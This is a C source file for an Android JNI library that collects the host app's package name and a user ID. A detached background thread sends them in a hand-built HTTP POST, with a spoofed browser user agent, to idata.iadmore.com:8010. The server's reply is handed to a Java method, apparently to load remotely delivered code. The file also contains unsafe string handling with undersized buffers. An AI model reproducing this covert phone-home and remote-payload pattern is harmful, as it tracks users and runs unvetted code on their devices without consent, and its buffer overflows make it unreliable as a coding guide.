//
// Created by Administrator on 2016/10/18.
//

#include "check.h"
#include "http.h"
#include "reflex.h"

#include <assert.h>
#include <Android/asset_manager.h >

static const char *END = "\r\n";
static const char *POST = "POST ";

char *uid = "";
char *pkg = "";
JavaVM *vvm;
jclass mAppClz;

void init2(void *jvm) {
    JNIEnv *env;
    jint res = (*vvm)->GetEnv(vvm, (void **) &env, JNI_VERSION_1_6);
    if (res != JNI_OK) {
        if (debug) LOGI("[x] init2 start 0 ");
        res = (*vvm)->AttachCurrentThread(vvm, &env, NULL);
        if (JNI_OK != res) {
            LOGE("Failed to AttachCurrentThread, ErrorCode = %d", res);
            (*vvm)->DetachCurrentThread(vvm);
            return;
        }
    }
    char *path = "/ad/findal ";
    char *host = "idata.iadmore.com";
    const int port = 8010;
    if (debug) LOGI("[x] init2 start");


    int sizeData = sizeof(char) * (strlen("uid=") + strlen(uid) + strlen("&pkg=") + strlen(pkg));
    if (debug) LOGI("data size is %d", sizeData);
    char *data = (char *) malloc(sizeData);
    strcpy(data, "uid");
    strcat(data, "=");
    strcat(data, uid);
    strcat(data, "&");
    strcat(data, "pkg");
    strcat(data, "=");
    strcat(data, pkg);

    char content[1024];
    strcpy(content, POST);
    strcat(content, path);
    strcat(content, " HTTP/1.1");
    strcat(content, END);

    strcat(content, "Host: ");
    strcat(content, host);
    strcat(content, END);

    strcat(content, "User-Agent:Mozilla/4.0(compatible;MSIE6.0;Windows NT 5.0)");
    strcat(content, END);

    strcat(content, "Accept-Language:zh-cn");
    strcat(content, END);

    strcat(content, "Accept:*/*");
    strcat(content, END);

    strcat(content, "Connection:Keep-Alive");
    strcat(content, END);

    strcat(content, "Content-Type: application/x-www-form-urlencoded");
    strcat(content, END);

    char *len = (char *) malloc(sizeof(char) * strlen(data));
    sprintf(len, "%d", strlen(data));
    strcat(content, "Content-Length: ");
    strcat(content, len);
    strcat(content, END);
    strcat(content, END);
    strcat(content, data);
    free(len);
    free(data);
    jbyteArray result = httpReq(env, content, host, port);
    if (debug) LOGI("shell check end.");
    if (result) {
        runStaticVoidMethodX(env, mAppClz, "a", "([B)V", result);
        if (debug) LOGI("shell check end. run a 1");
    }
    (*vvm)->DetachCurrentThread(vvm);
    return;
}


void initCheck(JavaVM *vm, JNIEnv *env) {
    if (debug) LOGI("[x] initCheck start");
    vvm = vm;
    jclass tmp = (*env)->FindClass(env, "com/bb_sz/ndk/App");
    mAppClz = (jclass) (*env)->NewGlobalRef(env, tmp);
    //get Context
    jobject context = getStaticObjectField(env, "com/bb_sz/ndk/App", "mContext", "Landroid/content/Context;");
    if (debug) LOGI("[x] init2 start 1 ");
    if (NULL == context) {
        if (debug) LOGE("[x] failed to get context");
        return;
    }
    else { if (debug) LOGI("[x] got context"); }

    // get mPKName
    jobject pkgName = runObjectMethod(env, "android/content/Context", context, "getPackageName", "()Ljava/lang/String;");
    if (NULL == pkgName) {
        if (debug) LOGE("[x] failed to getPackageName");
        (*env)->DeleteLocalRef(env, context);
        return;
    } else {
        pkg = Jstring2CStr(env, pkgName);
        if (debug) LOGI("[x] got  package name = %s", pkg);
    }

    //admainlib_new  //0x0000
//    share_key_app_id
//    jobject sp = runObjectMethod(env, "android/content/Context", context, "getSharedPreferences", "(Ljava/lang/String;I)Landroid/content/SharedPreferences;",
//                                 (*env)->NewStringUTF(env, "admainlib_new"), 0x0000);
//    if (!sp) return;
//    jobject uidStr = runObjectMethod(env, "android/content/SharedPreferences", sp, "getString", "(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;",
//                                     (*env)->NewStringUTF(env, "share_key_app_id"), (*env)->NewStringUTF(env, "null"));
//    if (!uidStr)return;
//    uid = Jstring2CStr(env, uidStr);
    jobject uidStr = getStaticObjectField(env, "com/bb_sz/ndk/App", "mUID", "Ljava/lang/String;");
    if (uidStr){
        uid = Jstring2CStr(env, uidStr);
    }

    // start thread
    pthread_t id;
    pthread_attr_t threadAttr_;
    pthread_attr_init(&threadAttr_);
    pthread_attr_setdetachstate(&threadAttr_, PTHREAD_CREATE_DETACHED);
    pthread_create(&id, &threadAttr_, (void *) init2, vvm);
    if (debug) LOGI("[x] initCheck end ret");
}

